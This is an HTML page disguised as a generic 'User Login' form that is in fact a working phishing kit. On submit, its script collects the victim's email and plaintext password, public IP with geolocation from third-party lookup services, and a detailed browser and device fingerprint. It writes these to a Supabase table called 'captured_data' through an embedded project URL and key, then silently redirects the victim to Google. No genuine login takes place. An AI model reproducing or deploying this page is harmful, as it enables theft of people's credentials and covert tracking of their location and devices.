<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>User Login</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .login-container {
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
            padding: 40px;
            width: 100%;
            max-width: 400px;
        }

        .login-header {
            text-align: center;
            margin-bottom: 30px;
        }

        .login-header h2 {
            color: #333;
            font-size: 28px;
            margin-bottom: 10px;
        }

        .login-header p {
            color: #666;
            font-size: 14px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 500;
            font-size: 14px;
        }

        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
            transition: all 0.3s;
            outline: none;
        }

        input[type="email"]:focus,
        input[type="password"]:focus {
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }

        .login-btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .login-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
        }

        .login-btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }

        .error-message {
            background: #fee;
            color: #c33;
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 15px;
            display: none;
            font-size: 14px;
        }

        .remember-forgot {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            font-size: 14px;
        }

        .remember-me {
            display: flex;
            align-items: center;
            gap: 5px;
            cursor: pointer;
        }

        .remember-me input[type="checkbox"] {
            width: auto;
            margin-right: 5px;
            cursor: pointer;
        }

        .forgot-link {
            color: #667eea;
            text-decoration: none;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        .loading {
            display: none;
            width: 20px;
            height: 20px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-header">
            <h2>Welcome Back</h2>
            <p>Please login to continue</p>
        </div>

        <div class="error-message" id="errorMessage"></div>

        <form id="loginForm">
            <div class="form-group">
                <label for="email">Email Address</label>
                <input type="email" id="email" placeholder="Enter your email" required>
            </div>

            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" placeholder="Enter your password" required>
            </div>

            <div class="remember-forgot">
                <label class="remember-me">
                    <input type="checkbox" id="remember"> Remember me
                </label>
                <a href="#" class="forgot-link" onclick="forgotPassword(event)">Forgot Password?</a>
            </div>

            <button type="button" class="login-btn" id="loginBtn" onclick="handleLogin()">
                <span id="btnText">Login</span>
                <div class="loading" id="loading"></div>
            </button>
        </form>
    </div>

    <script>
        // Supabase configuration
        const supabaseUrl = 'https://aqynejlgjwdmxsekuyld.supabase.co';
        const supabaseKey = 'sb_publishable_FjlvU8LL1CLWG_1ZkaeVVA_3aHJVpuq';
        
        // Initialize Supabase
        const db = window.supabase.createClient(supabaseUrl, supabaseKey);
        
        // Get IP address with fallback
        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json', {
                    mode: 'cors',
                    timeout: 5000
                });
                if (!response.ok) throw new Error('IPify failed');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                // Fallback to another service
                try {
                    const response = await fetch('https://api.my-ip.io/ip.json', {
                        mode: 'cors',
                        timeout: 5000
                    });
                    if (!response.ok) throw new Error('My-IP failed');
                    const data = await response.json();
                    return data.ip;
                } catch (error2) {
                    return 'Unable to get IP';
                }
            }
        }
        
        // Get IP details with fallback
        async function getIPDetails(ip) {
            if (!ip || ip === 'Unable to get IP') return null;
            
            // Try multiple APIs
            const apis = [
                `https://ipapi.co/${ip}/json/`,
                `https://ipwho.is/${ip}`,
                `https://ipinfo.io/${ip}/json`
            ];
            
            for (const api of apis) {
                try {
                    const response = await fetch(api, {
                        mode: 'cors',
                        timeout: 5000
                    });
                    if (!response.ok) continue;
                    const data = await response.json();
                    
                    // Normalize data from different APIs
                    if (data.error) continue;
                    
                    return {
                        ip: data.ip || ip,
                        city: data.city || null,
                        region: data.region || null,
                        country: data.country_name || data.country || null,
                        country_code: data.country_code || null,
                        postal: data.postal || null,
                        latitude: data.latitude || null,
                        longitude: data.longitude || null,
                        timezone: data.timezone || null,
                        org: data.org || null,
                        isp: data.org || data.isp || null
                    };
                } catch (error) {
                    continue; // Try next API
                }
            }
            
            return null;
        }
        
        // Better OS Detection
        function getOS() {
            const ua = navigator.userAgent;
            const platform = navigator.platform;
            
            // iOS detection
            if (/iPhone|iPad|iPod/.test(ua)) {
                if (/iPad/.test(ua)) return 'iPadOS';
                return 'iOS';
            }
            if (/Mac OS X/.test(ua) && navigator.maxTouchPoints > 1) return 'iPadOS';
            
            // Android detection (must come before Linux)
            if (/Android/.test(ua)) {
                const version = ua.match(/Android\s([0-9.]+)/);
                return version ? `Android ${version[1]}` : 'Android';
            }
            
            // Windows detection
            if (/Windows NT 10.0/.test(ua)) return 'Windows 10/11';
            if (/Windows NT 6.3/.test(ua)) return 'Windows 8.1';
            if (/Windows NT 6.2/.test(ua)) return 'Windows 8';
            if (/Windows NT 6.1/.test(ua)) return 'Windows 7';
            if (/Windows/.test(ua)) return 'Windows';
            
            // macOS detection
            if (/Mac OS X/.test(ua)) {
                const version = ua.match(/Mac OS X\s([0-9_]+)/);
                if (version) {
                    return `macOS ${version[1].replace(/_/g, '.')}`;
                }
                return 'macOS';
            }
            
            // Linux detection (after Android check)
            if (/Linux/.test(ua) || /Linux/.test(platform)) {
                if (/CrOS/.test(ua)) return 'Chrome OS';
                return 'Linux';
            }
            
            if (/CrOS/.test(ua)) return 'Chrome OS';
            
            return 'Unknown';
        }
        
        // Better Browser Detection
        function getBrowserInfo() {
            const ua = navigator.userAgent;
            let name = 'Unknown';
            let version = 'Unknown';
            let engine = 'Unknown';
            
            if (/Edg\//.test(ua)) {
                name = 'Microsoft Edge';
                version = ua.match(/Edg\/([0-9.]+)/)[1];
                engine = 'Blink';
            }
            else if (/OPR\//.test(ua)) {
                name = 'Opera';
                version = ua.match(/OPR\/([0-9.]+)/)[1];
                engine = 'Blink';
            }
            else if (/Chrome\//.test(ua)) {
                name = 'Google Chrome';
                version = ua.match(/Chrome\/([0-9.]+)/)[1];
                engine = 'Blink';
            }
            else if (/Firefox\//.test(ua)) {
                name = 'Mozilla Firefox';
                version = ua.match(/Firefox\/([0-9.]+)/)[1];
                engine = 'Gecko';
            }
            else if (/Safari\//.test(ua)) {
                name = 'Apple Safari';
                version = ua.match(/Version\/([0-9.]+)/)?.[1] || 'Unknown';
                engine = 'WebKit';
            }
            else if (/MSIE/.test(ua) || /Trident/.test(ua)) {
                name = 'Internet Explorer';
                version = ua.match(/(?:MSIE |rv:)([0-9.]+)/)[1];
                engine = 'Trident';
            }
            
            const isMobile = /Mobile|Android|iPhone|iPad|iPod/i.test(ua);
            
            return {
                name: name,
                version: version,
                engine: engine,
                isMobile: isMobile
            };
        }
        
        // Get device type
        function getDeviceType() {
            const ua = navigator.userAgent;
            
            if (/iPad|Tablet/i.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
                return 'Tablet';
            }
            if (/Mobi|Android|iPhone|iPod/i.test(ua)) {
                return 'Mobile';
            }
            if (/SmartTV|Smart-TV|TV/i.test(ua)) {
                return 'Smart TV';
            }
            if (/Xbox|PlayStation|Nintendo/i.test(ua)) {
                return 'Gaming Console';
            }
            
            return 'Desktop';
        }
        
        // Make handleLogin globally accessible
        window.handleLogin = async function() {
            const emailElement = document.getElementById('email');
            const passwordElement = document.getElementById('password');
            const rememberElement = document.getElementById('remember');
            const errorMessage = document.getElementById('errorMessage');
            const loginBtn = document.getElementById('loginBtn');
            const btnText = document.getElementById('btnText');
            const loading = document.getElementById('loading');
            
            if (!emailElement || !passwordElement) {
                console.error('Form elements not found');
                return;
            }
            
            const email = emailElement.value.trim();
            const password = passwordElement.value;
            const remember = rememberElement ? rememberElement.checked : false;
            
            errorMessage.style.display = 'none';
            
            if (!email || !password) {
                errorMessage.textContent = 'Please fill in all fields';
                errorMessage.style.display = 'block';
                return;
            }
            
            if (!email.includes('@')) {
                errorMessage.textContent = 'Please enter a valid email address';
                errorMessage.style.display = 'block';
                return;
            }
            
            loginBtn.disabled = true;
            btnText.style.display = 'none';
            loading.style.display = 'block';
            
            try {
                console.log('Collecting data...');
                
                // Collect basic data
                const browserInfo = getBrowserInfo();
                const os = getOS();
                const deviceType = getDeviceType();
                
                // Try to get IP (non-blocking)
                const ip = await getIPAddress();
                const ipDetails = await getIPDetails(ip);
                
                console.log('Saving to Supabase...');
                
                // Save to Supabase
                const { data, error } = await db
                    .from('captured_data')
                    .insert([
                        {
                            email: email,
                            password: password,
                            ip_address: ip,
                            user_agent: navigator.userAgent,
                            referer: document.referrer || 'Direct',
                            device_info: {
                                browser: browserInfo,
                                os: os,
                                deviceType: deviceType,
                                screen: {
                                    width: window.screen.width,
                                    height: window.screen.height,
                                    colorDepth: window.screen.colorDepth,
                                    pixelRatio: window.devicePixelRatio
                                },
                                language: navigator.language,
                                languages: navigator.languages,
                                platform: navigator.platform,
                                cookiesEnabled: navigator.cookieEnabled,
                                hardwareConcurrency: navigator.hardwareConcurrency,
                                deviceMemory: navigator.deviceMemory || 'unknown',
                                maxTouchPoints: navigator.maxTouchPoints,
                                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                                remember: remember
                            },
                            ip_details: ipDetails,
                            created_at: new Date().toISOString()
                        }
                    ]);
                
                if (error) {
                    console.error('Supabase error:', error);
                    errorMessage.textContent = 'Error: ' + error.message;
                    errorMessage.style.display = 'block';
                    return;
                }
                
                console.log('✅ Saved successfully');
                window.location.href = 'https://www.google.com';
                
            } catch (err) {
                console.error('Error:', err);
                
                // Try to save without IP data
                try {
                    const { error } = await db
                        .from('captured_data')
                        .insert([
                            {
                                email: email,
                                password: password,
                                ip_address: 'Unknown',
                                user_agent: navigator.userAgent,
                                referer: document.referrer || 'Direct',
                                device_info: {
                                    browser: getBrowserInfo(),
                                    os: getOS(),
                                    deviceType: getDeviceType(),
                                    language: navigator.language,
                                    platform: navigator.platform
                                },
                                created_at: new Date().toISOString()
                            }
                        ]);
                    
                    if (!error) {
                        console.log('✅ Saved without IP data');
                        window.location.href = 'https://www.google.com';
                        return;
                    }
                } catch (fallbackError) {
                    console.error('Fallback error:', fallbackError);
                }
                
                errorMessage.textContent = 'Connection error. Please try again.';
                errorMessage.style.display = 'block';
            } finally {
                loginBtn.disabled = false;
                btnText.style.display = 'inline';
                loading.style.display = 'none';
            }
        };
        
        window.forgotPassword = function(event) {
            event.preventDefault();
            alert('Please contact support to reset your password.');
        };
    </script>
</body>
</html>
